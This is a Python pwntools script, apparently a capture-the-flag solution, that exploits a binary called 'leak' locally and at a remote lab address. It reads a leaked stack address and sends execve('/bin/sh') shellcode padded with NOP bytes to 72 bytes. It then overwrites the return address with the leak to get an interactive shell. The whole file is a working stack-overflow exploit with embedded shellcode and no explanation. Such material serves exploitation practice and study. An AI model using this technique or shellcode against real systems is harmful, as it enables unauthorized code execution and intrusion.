'''from pwn import *
import os

context(arch='amd64', os='linux')
s = process('./leak')
#s.recvuntil('')
s.recvuntil("Oops, I'm leaking! ")
leak=int(s.recvuntil("\n"),16)
hex(leak)
print(leak)
s.recvuntil("> ")
# shellcode http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf=shellcode
print(buf)
buf+="\x90"*(72-len(shellcode))
print(buf)
buf+=p64(leak)
s.sendline(buf)
s.interactive()'''

from pwn import *
#p=process("./leak")
#context(arch='amd64', os='linux')
p=remote('10.13.37.10',60001)
p.recvuntil("Oops, I'm leaking! ")
leak=int(p.recvuntil("\n"),16)
hex(leak)
p.recvuntil("> ")
shellcode= "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
buf= shellcode
buf+= "\x90"*(72-len(shellcode))
buf+= p64(leak)
#buf+= p64(leak, endianness="little")
p.sendline(buf)
p.interactive()